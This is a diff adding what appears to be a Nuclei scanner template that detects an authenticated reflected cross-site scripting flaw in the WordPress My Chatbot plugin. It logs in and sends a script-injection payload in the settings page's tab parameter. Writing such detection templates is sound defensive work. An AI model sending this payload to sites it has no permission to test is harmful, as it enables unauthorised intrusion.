@@ -1,0 +1,47 @@
+id: my-chatbot-xss
+
+info:
+  name: WordPress My Chatbot <= 1.1 - Cross-Site Scripting
+  author: dhiyaneshDk
+  severity: high
+  description: WordPress My Chatbot <= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.
+  reference:
+    - https://wpscan.com/vulnerability/c0b6f63b-95d1-4782-9554-975d6d7bbd3d
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: wordpress,wp-plugin,xss,authenticated,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "</script><script>alert(document.domain)</script>"
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450220476dbfab9df29aca768609f5211466992b811edb72819acd45d49290822a07e0022100c43843ecf923b3e4faaf24cbe0b5c2545d7589bc0cef9d7d9708d552ea89af06:922c64590222798bb761d5b6d8e72950
